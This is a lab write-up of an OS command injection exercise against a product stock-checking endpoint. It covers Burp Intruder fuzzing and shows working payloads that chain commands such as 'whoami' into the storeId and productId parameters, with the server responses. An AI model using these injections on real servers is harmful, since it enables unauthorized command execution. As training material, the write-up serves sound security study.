

## 1. Initial reconnaissance
Start by browsing the application and identifying functionality that might execute server-side commands. The product pages exposed the following endpoints:
- `GET /product?productId=<id>`
- `POST /product/stock` with form data `productId=<id>&storeId=<id>`

Submitting the stock-checking form returned plain text responses, which suggested that a backend script or CLI tool might be used to fetch stock information.

## 2. Testing methodology
Because the lab description hinted at OS command injection and the responses were raw text, focus on the `POST /product/stock` endpoint. Intercept a request in Burp Suite and sent it to Intruder.

I configured an **Intruder Sniper attack**:
- **Target parameter:** `storeId` (initially; `productId` could be tested as well).
- **Payload type:** simple command injection payload list such as:
  - From Burp’s built-in “Fuzzing – command injection”
  - Or `command_exec.txt` from PayloadAllTheThings.

The idea is to inject shell metacharacters and look for abnormal responses, syntax errors, or injected markers.

## 3. Payload construction
Try payloads like the following in `storeId`:

1. **Echo marker to confirm command execution**
   - Raw: `1{base};echo 111111`
   - URL-encoded: `1%7bbase%7d%3becho%20111111`

   Response contained something like:
   ```
   87
   111111
   ```
   This showed that an extra `echo` command was successfully executed after the stock checker.

2. **Trigger a shell error**
   - Raw: `1'`
   - This produced an error similar to:
   ```
   sh: 1: Syntax error: Unterminated quoted string
   ```
   Again, this confirmed that user input was being passed into a shell command, and quotation characters were affecting the command syntax.

Having confirmed OS command injection, construct the final exploit payload.

3. **Final payload to leak `whoami`**
   - Request body:
     ```
     productId=2&storeId=1;whoami
     ```

   Since the application returns raw command output, the response included the username of the account running the command, such as:
   ```
   87
   www-data
   ```

Observe the parameter `productId` is also vulnerable:
request 1: `productId=1;whoami;&storeId=1`
response 1: `/home/peter-RqktJ6/stockreport.sh: line 5: $2: unbound variable
whoami: extra operand '1'
Try 'whoami --help' for more information.`
100% is vulnerable, let's "close" the command.

request 1: `productId=1;whoami;&storeId=1`
response 1: `/home/peter-pSDKwK/stockreport.sh: line 5: $2: unbound variable
sh: 1: 1: not found`
Syntax is still incorrect. Need to make last piece of commad valid.

request 1: `productId=1;whoami;echo+&storeId=1`
response 1: `peter-pSDKwK
1`
Finally works.

## 4. Completing the attack
Once observed `whoami` output in the server’s response, the lab’s objective was met:
- Confirm that arbitrary commands can be executed on the server.
- Extract the identity of the runtime user, which is crucial for assessing privilege level and planning further steps in a real-world scenario.

